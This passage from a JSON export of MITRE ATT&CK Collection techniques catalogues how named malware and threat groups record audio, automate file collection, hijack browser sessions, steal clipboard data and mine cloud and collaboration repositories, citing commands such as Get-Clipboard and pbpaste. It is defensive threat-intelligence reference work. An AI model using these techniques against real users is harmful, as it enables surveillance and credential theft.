that is capable of recording audio using available input sound devices."}, {"id": "S0234", "name": "Bandook", "description": "Bandook has modules that are capable of capturing audio."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to record audio from the compromised host."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT has a feature to perform voice recording on the victim\u2019s machine."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can perform audio surveillance using microphones."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can listen in to victims' conversations through the system\u2019s microphone."}, {"id": "S0021", "name": "Derusbi", "description": "Derusbi is capable of performing audio captures."}, {"id": "S0213", "name": "DOGCALL", "description": "DOGCALL can capture microphone data from the victim's machine."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab has the capability to capture audio from a victim machine."}, {"id": "S0143", "name": "Flame", "description": "Flame can record audio using any existing hardware recording devices."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a remote microphone monitoring capability."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can record sound using input audio devices."}, {"id": "S0163", "name": "Janicab", "description": "Janicab captured audio and sent it out to a C2 server."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can capture microphone recordings."}, {"id": "S0409", "name": "Machete", "description": "Machete captures audio from the computer\u2019s microphone."}, {"id": "S1016", "name": "MacMa", "description": "MacMa has the ability to record audio."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy can record the sounds from microphones on a computer."}, {"id": "S1146", "name": "MgBot", "description": "MgBot can capture input and output audio streams from infected devices."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia can perform microphone recording."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore can capture audio feeds from the system."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can load a module to leverage the LAME encoder and mciSendStringW to control and capture audio."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's Get-MicrophoneAudio Exfiltration module can record system microphone audio."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can record sound with the microphone."}, {"id": "S0332", "name": "Remcos", "description": "Remcos can capture data from the system\u2019s microphone."}, {"id": "S0379", "name": "Revenge RAT", "description": "Revenge RAT has a plugin for microphone interception."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT has an audio capture and eavesdropping module."}, {"id": "S0098", "name": "T9000", "description": "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to %APPDATA%\\Intel\\Skype."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to capture VoiceIP application audio on an infected host."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN can perform audio capture."}], "sub_techniques": []}, {"name": "Automated Collection", "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.", "detailed_description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals.\nIn cloud-based environments, adversaries may also use cloud APIs, data pipelines, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data.\nThis functionality could also be built into remote access tools.\nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.", "id": "T1119", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius used a custom tool, sql.net4.exe, to query SQL databases and then identify and extract personally identifiable information."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has automatically collected data from USB drives, keystrokes, and screen images before exfiltration."}, {"id": "G0006", "name": "APT1", "description": "APT1 used a batch script to perform a series of discovery techniques and saves it to a text file."}, {"id": "G0007", "name": "APT28", "description": "APT28 used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used tools such as SQLULDR2 and PINEGROVE to gather local system and database information."}, {"id": "S0438", "name": "Attor", "description": "Attor has automatically collected data about the compromised system."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS monitors USB devices and copies files with certain extensions to a predefined directory."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot recursively generates a list of files within a directory and sends them back to the control server."}, {"id": "S1043", "name": "ccf32", "description": "ccf32 can be used to automatically collect files from a compromised host."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used custom DLLs for continuous retrieval of data from memory."}, {"id": "S0244", "name": "Comnie", "description": "Comnie executes a batch script to store discovery information in %TEMP%\\info.dat and then uploads the temporarily file to the remote C2 server."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has used a file stealer to steal documents and images with the following extensions: txt, pdf, png, jpg, doc, xls, xlm, odp, ods, odt, rtf, ppt, xlsx, xlsm, docx, pptx, and jpeg."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can automatically monitor removable drives in a loop and copy interesting files."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate searches for stored credentials associated with cryptocurrency wallets and notifies the command and control server when identified."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear engages in mass collection from compromised systems during intrusions."}, {"id": "S0363", "name": "Empire", "description": "Empire can automatically gather the username, domain name, machine name, and other information from a compromised system."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 scans processes on all victim systems in the environment and uses automated scripts to pull back the results."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used a script to iterate through a list of compromised PoS systems, copy and remove data to a log file, and to bind to events from the submit payment button."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors used Empire to automatically gather the username, domain name, machine name, and other system information."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can monitor files for changes and automatically collect them."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has deployed scripts on compromised systems that automatically scan for interesting documents."}, {"id": "S0597", "name": "GoldFinder", "description": "GoldFinder logged and stored information related to the route or hops a packet took from a compromised machine to a hardcoded C2 server, including the target C2 URL, HTTP response/status code, HTTP response headers and values, and data received from the C2 node."}, {"id": "S0170", "name": "Helminth", "description": "A Helminth VBScript receives a batch script to execute a set of commands in a command prompt."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can sort and collect specific documents as well as generate a list of all files on a newly inserted drive and store them in an encrypted file."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has performed frequent and scheduled data collection from victim networks."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron can be configured to automatically collect files under a specified directory."}, {"id": "S1101", "name": "LoFiSe", "description": "LoFiSe can collect all the files from the working directory every three hours and place them into a password-protected archive for further exfiltration."}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used the Csvde tool to collect Active Directory files and data."}, {"id": "S0443", "name": "MESSAGETAP", "description": "MESSAGETAP checks two files, keyword_parm.txt and parm.txt, for instructions on how to target and save data parsed and extracted from SMS message data from the network traffic. If an SMS message contained either a phone number, IMSI number, or keyword that matched the predefined list, it is saved to a CSV file for later theft by the threat actor."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has automatically collected mouse clicks, continuous screenshots on the machine, and set timers to collect the contents of the clipboard and website browsing."}, {"id": "S0339", "name": "Micropsia", "description": "Micropsia executes an RAR tool to recursively archive files based on a predefined list of file extensions (.xls, .xlsx, .csv, .odt, .doc, .docx, .ppt, .pptx, .pdf, .mdb, .accdb, .accde, *.txt)."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda used custom batch scripts to collect files automatically from a targeted system."}, {"id": "S0699", "name": "Mythic", "description": "Mythic supports scripting of file downloads from agents."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can automatically archive collected data."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY collection is automatically recorded to a specified file on the victim machine."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used automated collection."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used a script to collect information about the infected system."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can automatically scan for and collect files with specific extensions."}, {"id": "S1109", "name": "PACEMAKER", "description": "PACEMAKER can enter a loop to read /proc/ entries every 2 seconds in order to read a target application's memory."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can automatically collect data, such as CloudFormation templates, EC2 user data, AWS Inspector reports, and IAM credential reports."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork developed a file stealer to search C:\\ and collect files with certain extensions. Patchwork also executed a script to enumerate all drives, store them as a list, and upload generated files to the C2 server."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT used file system monitoring to track modification and enable automatic exfiltration."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 contains a module for recursively parsing through files and directories to gather valid credit card numbers."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc automatically collects data about the victim and sends it to the control server."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer collects files and directories from victim systems based on configuration data downloaded from command and control servers."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can conduct an initial scan for Microsoft Word documents on the local system, removable media, and connected network drives, before tagging and collecting them. It can continue tagging documents to collect with follow up scans."}, {"id": "G1039", "name": "RedCurl", "description": "RedCurl has used batch scripts to collect data."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools automatically gathers data from Azure AD environments using the Azure Graph API."}, {"id": "S1078", "name": "RotaJakiro", "description": "Depending on the Linux distribution, RotaJakiro executes a set of commands to collect device information and sends the collected information to the C2 server."}, {"id": "S0090", "name": "Rover", "description": "Rover automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe."}, {"id": "S0148", "name": "RTM", "description": "RTM monitors browsing activity and automatically captures screenshots if a victim browses to a URL matching one of a list of strings."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators."}, {"id": "G0121", "name": "Sidewinder", "description": "Sidewinder has used tools to automatically collect system and network configuration information."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has a file searcher component that can automatically collect and archive files based on a predefined list of file extensions."}, {"id": "S0098", "name": "T9000", "description": "T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, .ppt, .xls, .docx, .pptx, *.xlsx). Any matching files are encrypted and written to a local user directory."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to index and compress files into a send queue for exfiltration."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 ran a command to compile an archive of file types of interest from the victim user's directories."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has collected information automatically using the adversary's USBferry attack."}, {"id": "S0136", "name": "USBStealer", "description": "For all non-removable drives on a victim, USBStealer executes automated collection of certain files for later exfiltration."}, {"id": "S0476", "name": "Valak", "description": "Valak can download a module to search for and build a report of harvested credential data."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN saves each collected file with the automatically generated format {0:dd-MM-yyyy}.txt ."}, {"id": "S0466", "name": "WindTail", "description": "WindTail can identify and add files that possess specific file extensions to an array for archiving."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy scans the system and automatically collects files with the following extensions: .doc, .docx, ,.xls, .xlsx, .pdf, .pptx, .rar, .zip, .jpg, .jpeg, .bmp, .tiff, .kum, .tlg, .sbx, .cr, .hse, .hsf, and .lhz."}], "sub_techniques": []}, {"name": "Browser Session Hijacking", "description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.", "detailed_description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.\nA specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet. Executing browser-based behaviors such as pivoting may require specific process permissions, such as SeDebugPrivilege and/or high-integrity/administrator rights.\nAnother example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such as Sharepoint or webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.", "id": "T1185", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to use form-grabbing to extract data from web data forms."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has captured credentials when a user performs login through a SSL session."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates."}, {"id": "S0384", "name": "Dridex", "description": "Dridex can perform browser attacks via web injects to steal information such as credentials, certificates, and cookies."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.  IcedID can use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can use advanced web injects to steal web banking credentials."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords)."}], "sub_techniques": []}, {"name": "Clipboard Data", "description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications.", "detailed_description": "Adversaries may collect data stored in the clipboard from users copying information within or between applications.\nFor example, on Windows adversaries can access clipboard data by using clip.exe or Get-Clipboard. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\nmacOS and Linux also have commands, such as pbpaste, to grab clipboard contents.", "id": "T1115", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can steal data from the victim\u2019s clipboard."}, {"id": "G0082", "name": "APT38", "description": "APT38 used a Trojan called KEYLIME to collect data from the clipboard."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used tools capable of stealing contents of the clipboard."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth collects information from the clipboard by using the OpenClipboard() and GetClipboardData() libraries. "}, {"id": "S0438", "name": "Attor", "description": "Attor has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs."}, {"id": "S0454", "name": "Cadelspy", "description": "Cadelspy has the ability to steal data from the clipboard."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas steals data stored in the clipboard."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can capture content from the clipboard."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to capture and store clipboard data."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke copies and exfiltrates the clipboard contents every 30 seconds."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet can steal data from the clipboard."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate starts a thread on execution that captures clipboard data and logs it to a predefined log file."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla can download a clipboard information stealer module."}, {"id": "S0363", "name": "Empire", "description": "Empire can harvest clipboard data on both Windows and macOS systems."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has a function to use the OpenClipboard wrapper."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy can collect clipboard data."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can capture clipboard data from a compromised host."}, {"id": "S0170", "name": "Helminth", "description": "The executable version of Helminth has a module to log clipboard contents."}, {"id": "S0044", "name": "JHUHUGIT", "description": "A JHUHUGIT variant accesses a screenshot saved in the clipboard and converts it to a JPG image."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can capture clipboard data."}, {"id": "S0250", "name": "Koadic", "description": "Koadic can retrieve the current content of the user clipboard."}, {"id": "S0356", "name": "KONNI", "description": "KONNI had a feature to steal data from the clipboard."}, {"id": "S0409", "name": "Machete", "description": "Machete hijacks the clipboard data by creating an overlapped window that listens to keyboard events."}, {"id": "S0282", "name": "MacSpy", "description": "MacSpy can steal clipboard contents."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can capture clipboard content."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz can monitor content saved to the clipboard."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has a function to hijack data from the clipboard by monitoring the contents of the clipboard and replacing the cryptocurrency wallet with the attacker's."}, {"id": "S1146", "name": "MgBot", "description": "MgBot can capture clipboard data."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has the ability to capture and replace Bitcoin wallet data in the clipboard on a compromised host."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors collected clipboard data in plaintext."}, {"id": "S0332", "name": "Remcos", "description": "Remcos steals and modifies data from the clipboard."}, {"id": "S0375", "name": "Remexi", "description": "Remexi collects text from the clipboard."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can extract clipboard data from a compromised host."}, {"id": "S0148", "name": "RTM", "description": "RTM collects data from the clipboard."}, {"id": "S0253", "name": "RunningRAT", "description": "RunningRAT contains code to open and copy data from the clipboard."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can monitor Clipboard text and can use System.Windows.Forms.Clipboard.GetText() to collect data from the clipboard."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to steal data from the clipboard of an infected host."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot contains functionality to collect information from the clipboard."}, {"id": "S0257", "name": "VERMIN", "description": "VERMIN collects data stored in the clipboard."}, {"id": "S0330", "name": "Zeus Panda", "description": "Zeus Panda can hook GetClipboardData function to watch for clipboard pastes to collect."}], "sub_techniques": []}, {"name": "Data from Cloud Storage", "description": "Adversaries may access data from cloud storage.", "detailed_description": "Adversaries may access data from cloud storage.\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform.\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the Cloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., Data from Information Repositories).\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem. There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.", "id": "T1530", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can collect files from a user\u2019s OneDrive."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider accessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has obtained files from the victim's cloud storage instances."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can enumerate and download files stored in AWS storage services, such as S3 buckets."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider enumerates data stored in cloud resources for collection and exfiltration purposes."}], "sub_techniques": []}, {"name": "Data from Configuration Repository", "description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.", "detailed_description": "Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.", "id": "T1602", "examples": [], "sub_techniques": [{"name": "SNMP (MIB Dump)", "description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).", "detailed_description": "Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.", "id": "T1602.001", "examples": []}, {"name": "Network Device Configuration Dump", "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.", "detailed_description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.", "id": "T1602.002", "examples": []}]}, {"name": "Data from Information Repositories", "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., Transfer Data to Cloud Account).", "detailed_description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., Transfer Data to Cloud Account).\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:\nIn some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.", "id": "T1213", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has collected files from various information repositories."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST collected data from victim Oracle databases using SQLULDR2."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has collected schemas and user accounts from systems running SQL Server."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes a module capable of stealing content from the Tencent QQ database storing user QQ message history on infected devices."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell has the ability to list and extract data from SQL databases."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer gathers information from repositories associated with cryptocurrency wallets and the Telegram messaging service."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team exfiltrates data of interest from enterprise databases using Adminer."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products, services, and internal business operations."}, {"id": "G0010", "name": "Turla", "description": "Turla has used a custom .NET tool to collect documents from an organization's internal central database."}], "sub_techniques": [{"name": "Confluence", "description": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:", "detailed_description": "Adversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as:", "id": "T1213.001", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has searched a victim's network for collaboration platforms like Confluence and JIRA to discover further high-privilege account credentials."}]}, {"name": "Sharepoint", "description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:", "detailed_description": "Adversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint:", "id": "T1213.002", "examples": [{"id": "G1024", "name": "Akira", "description": "Akira has accessed and downloaded information stored in SharePoint instances as part of data gathering and exfiltration activity."}, {"id": "G0007", "name": "APT28", "description": "APT28 has collected information from Microsoft SharePoint services within target networks."}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider accessed victim SharePoint environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has collected documents from the victim's SharePoint."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang used a SharePoint enumeration and data dumping tool known as spwebmember."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has searched a victim's network for collaboration platforms like SharePoint to discover further high-privilege account credentials."}, {"id": "S0227", "name": "spwebmember", "description": "spwebmember is used to enumerate and dump information from Microsoft SharePoint."}]}, {"name": "Code Repositories", "description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.", "detailed_description": "Adversaries may leverage code repositories to collect valuable information. Code repositories are tools/services that store source code and automate software builds. They may be hosted internally or privately on third party sites such as Github, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.\nOnce adversaries gain access to a victim network or a private code repository, they may collect sensitive information such as proprietary source code or Unsecured Credentials contained within software's source code.  Having access to software's source code may allow adversaries to develop Exploits, while credentials may provide access to additional resources using Valid Accounts.\nNote: This is distinct from Code Repositories, which focuses on conducting Reconnaissance via public code repositories.", "id": "T1213.003", "examples": [{"id": "G0096", "name": "APT41", "description": "APT41 cloned victim user Git repositories during intrusions."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has searched a victim's network for code repositories like GitLab and GitHub to discover further high-privilege account credentials."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider enumerates data stored within victim code repositories, such as internal GitHub repositories."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 downloaded source code from code repositories."}]}, {"name": "Customer Relationship Management Software", "description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.", "detailed_description": "Adversaries may leverage Customer Relationship Management (CRM) software to mine valuable information. CRM software is used to assist organizations in tracking and managing customer interactions, as well as storing customer data.\nOnce adversaries gain access to a victim organization, they may mine CRM software for customer data. This may include personally identifiable information (PII) such as full names, emails, phone numbers, and addresses, as well as additional details such as purchase histories and IT support interactions. By collecting this data, an adversary may be able to send personalized Phishing emails, engage in SIM swapping, or otherwise target the organization\u2019s customers in ways that enable financial gain or the compromise of additional organizations.\nCRM software may be hosted on-premises or in the cloud. Information stored in these solutions may vary based on the specific instance or environment. Examples of CRM software include Microsoft Dynamics 365, Salesforce, Zoho, Zendesk, and HubSpot.", "id": "T1213.004", "examples": []}, {"name": "Messaging Applications", "description": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.", "detailed_description": "Adversaries may leverage chat and messaging applications, such as Microsoft Teams, Google Chat, and Slack, to mine valuable information.\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on messaging applications:\nIn addition to exfiltrating data from messaging applications, adversaries may leverage data from chat messages in order to improve their targeting - for example, by learning more about an environment or evading ongoing incident response efforts.", "id": "T1213.005", "examples": [{"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has accessed victim security and IT environments and Microsoft Teams to mine valuable information."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider threat actors search the 